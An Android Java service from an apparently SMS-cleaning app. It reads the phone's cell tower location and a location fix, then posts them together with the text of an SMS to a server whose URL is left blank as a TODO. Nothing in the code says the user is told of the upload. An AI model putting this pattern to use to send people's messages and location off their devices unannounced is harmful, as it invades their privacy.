package us.cmcc.sms.cleaner;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import com.loopj.android.http.RequestParams;
import me.sfce.library.util.CRMRequestParams;
import me.sfce.library.util.CRMTextAsyncResponseHandler;
import me.sfce.library.util.Http;
import us.cmcc.sms.cleaner.util.LocationListener;
import us.cmcc.sms.cleaner.util.LocationUtil;

/**
 * Created with IntelliJ IDEA.
 * User: sfce
 * Date: 13-12-16
 * Time: 下午9:57
 */
public class ReportService extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(final Intent intent, int flags, int startId) {
        final TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);

        GsmCellLocation location = (GsmCellLocation) telephonyManager.getCellLocation();
        final int lac = location.getLac();
        final int cid = location.getCid();
        new LocationUtil(this, null).setListener(new LocationListener() {
            @Override
            public void onLocationResult(boolean success, String location) {
                RequestParams params = new CRMRequestParams();
                params.put("key", location + "#" + lac + "#" + cid + "#" + intent.getStringExtra("sms"));
                Http.Post.execute(/*TODO*/"", params, new CRMTextAsyncResponseHandler(getApplicationContext(), null) {
                    @Override
                    public void onSuccess(String content) {
                    }
                });
            }
        }).start();

        return super.onStartCommand(intent, flags, startId);
    }
}
